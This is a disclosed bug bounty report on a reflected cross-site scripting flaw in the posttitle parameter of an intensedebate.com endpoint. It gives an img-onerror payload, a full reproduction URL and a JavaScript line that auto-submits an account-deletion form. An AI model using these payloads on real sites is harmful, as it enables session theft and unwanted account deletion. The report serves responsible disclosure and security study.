---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1043804'
original_report_id: '1043804'
title: Reflected XSS in https://www.intensedebate.com/js/getCommentLink.php
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: automattic
created_at: '2020-11-26T03:44:11.373Z'
disclosed_at: '2021-01-30T04:45:27.203Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 74
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS in https://www.intensedebate.com/js/getCommentLink.php

## Metadata

- HackerOne Report ID: 1043804
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: automattic
- Disclosed At: 2021-01-30T04:45:27.203Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey there,
I have found a reflected dom xss vulnerability in your website www.intensedebate.com, the *posttitle* parameter is vulnerable.

---------------------------------------------------------------------------------------------------------------------------------------------------


**Full url:** https://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posttitle=xss
**Parameter:** posttitle
**XSS Payload:** "><img src=x onerror=alert(1)>

---------------------------------------------------------------------------------------------------------------------------------------------------


**Steps to reproduce:**
Just load this url in your browser and you will get the xss popup

https://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posttitle=%3Cimg%20src=x%20onerror=alert(document.domain)%3E

---------------------------------------------------------------------------------------------------------------------------------------------------

**POC:**

{F1094491}

-----------------------------------------------------------------------------------------------------------------------------------------------------

## Impact

An attacker steal cookies of logged in users just by sending the url with the xss-payload, can redirect users to another websites,virtual defacement,etc.
Also Looking at the page: https://www.intensedebate.com/your-information, there are two actions available *Account Closure*, *Data export* with the xss we can perform this action on behalf of the user for eg:

```javascript
 document.getElementById('frm2').submit();
```
With a js code like this we can auto submit this  form so that when the user visits the url, his/her account will automatically will be deleted. 


Thankyou
Kind Regards
Sudhanshu

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
